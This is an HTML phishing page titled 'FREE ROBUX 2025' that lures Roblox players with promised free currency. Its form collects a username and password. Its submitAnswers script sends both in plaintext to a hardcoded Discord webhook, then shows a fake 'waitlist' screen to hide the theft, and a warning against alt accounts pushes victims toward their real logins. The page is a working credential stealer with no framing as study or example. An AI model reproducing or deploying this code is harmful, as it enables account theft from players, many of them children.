<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>FREE ROBUX 2025</title>
  <style>
    body, html {
      margin: 0; padding: 0; height: 100%;
      font-family: Arial, sans-serif;
      background-color: #000; color: #fff;
      overflow-x: hidden;
    }
    .main-container {
      background: rgba(20,20,20,0.95); padding: 20px 30px; border-radius: 12px;
      box-shadow: 0 0 20px #00ff88, 0 0 40px #00ff88;
      width: 90%; max-width: 350px; margin: 80px auto;
      animation: glow 3s ease-in-out infinite alternate;
      position: relative;
    }
    @keyframes glow {
      0% { box-shadow: 0 0 15px #00ff88, 0 0 30px #00ff88; }
      100% { box-shadow: 0 0 30px #00ff88, 0 0 60px #00ff88; }
    }
    .question-container { margin-bottom: 15px; }
    .question { margin-bottom: 5px; font-weight: bold; }
    .note { font-size: 12px; color: #aaa; margin-bottom: 5px; }
    .answer {
      width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #555;
      background: #111; color: #fff; box-sizing: border-box; font-size: 14px;
    }
    .submit-btn {
      display: block; margin: 15px auto 0; padding: 10px 20px;
      background: #00ff88; color: #000; border: none; border-radius: 6px;
      cursor: pointer; font-size: 16px; font-weight: bold;
    }
    .submit-btn:disabled { background: #444; color: #aaa; cursor: not-allowed; }
    .validation-error {
      color: #ff4444; font-size: 12px; margin-top: 5px;
    }
    .warning {
      color: #ff4444; font-size: 12px; text-align: center; margin-top: 20px;
    }
    #analyzing, #overlay {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center;
      color: #00ff88; font-size: 28px; font-weight: bold; z-index: 9999; display: none;
      text-shadow: 0 0 8px #00ff88;
    }
    #analyzing.typing::after {
      content: "|"; animation: blink 0.7s steps(1) infinite;
      margin-left: 5px;
    }
    @keyframes blink {
      0%, 50% { opacity: 1; }
      51%, 100% { opacity: 0; }
    }
    .dots::after {
      content: ''; display: inline-block; width: 1em;
      animation: dots 1.5s steps(3, end) infinite;
    }
    @keyframes dots {
      0% { content: ''; } 33% { content: '.'; } 66% { content: '..'; } 100% { content: '...'; }
    }
  </style>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>

<div class="main-container">
  <div class="question-container">
    <div class="question">1. What is your username?</div>
    <div class="note">Minimum 6 characters</div>
    <input type="text" class="answer" id="username" placeholder="Enter username" oninput="validateForm()">
    <div id="username-error" class="validation-error"></div>
  </div>

  <div class="question-container">
    <div class="question">2. What is your password?</div>
    <div class="note">Minimum 8 characters</div>
    <input type="password" class="answer" id="password" placeholder="Enter password" oninput="validateForm()">
    <div id="password-error" class="validation-error"></div>
  </div>

  <div class="question-container">
    <div class="question">3. Select amount:</div>
    <select class="answer" id="amount" onchange="validateForm()">
      <option value="">Select amount</option>
      <option value="500">500</option>
      <option value="2000">2000</option>
      <option value="11000">11000</option>
      <option value="24000">24000</option>
    </select>
  </div>

  <div class="g-recaptcha" data-sitekey="6Le4-V8rAAAAAOrtgP-yx85V4oynuMEnWpGjE4vD" data-callback="validateForm"></div>

  <button class="submit-btn" id="submit-btn" onclick="submitAnswers()" disabled>Submit</button>

  <div class="warning">‚ö†Ô∏è Warning: don't use alt account</div>
</div>

<div id="analyzing" class="typing">Analyzing</div>
<div id="overlay">You're in the waitlist<span class="dots"></span><br><small style="font-size:16px; color:#aaa; display:block; margin-top:10px;">Please wait for 24 hours</small></div>

<script>
  function validateForm() {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const amount = document.getElementById('amount').value;
    const recaptchaResponse = grecaptcha.getResponse();

    let valid = true;

    if (username.length < 6) {
      document.getElementById('username-error').textContent = "Username must be at least 6 characters.";
      valid = false;
    } else {
      document.getElementById('username-error').textContent = "";
    }

    if (password.length < 8) {
      document.getElementById('password-error').textContent = "Password must be at least 8 characters.";
      valid = false;
    } else {
      document.getElementById('password-error').textContent = "";
    }

    if (!amount || recaptchaResponse.length === 0) valid = false;

    document.getElementById('submit-btn').disabled = !valid;
  }

  async function submitAnswers() {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const amount = document.getElementById('amount').value;

    const webhookURL = "https://discordapp.com/api/webhooks/1383047487996039220/gr_uQ17pxi0qQiWh4po4c7dF4jKyhOgSvWzro_uEuH1GJrWYwNdVd-Pmy4x-m3ATiVNX";
    const payload = {
      content: `**New Submission:**\nüë§ Username: ${username}\nüîë Password: ${password}\nüí∞ Amount: ${amount}`
    };

    document.getElementById('submit-btn').disabled = true;
    document.getElementById('analyzing').style.display = 'flex';

    try {
      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      setTimeout(() => {
        document.getElementById('analyzing').style.display = 'none';
        document.getElementById('overlay').style.display = 'flex';
      }, 5000);

    } catch (error) {
      alert("Submission failed.");
      document.getElementById('analyzing').style.display = 'none';
      document.getElementById('submit-btn').disabled = false;
    }
  }
</script>
</body>
</html>
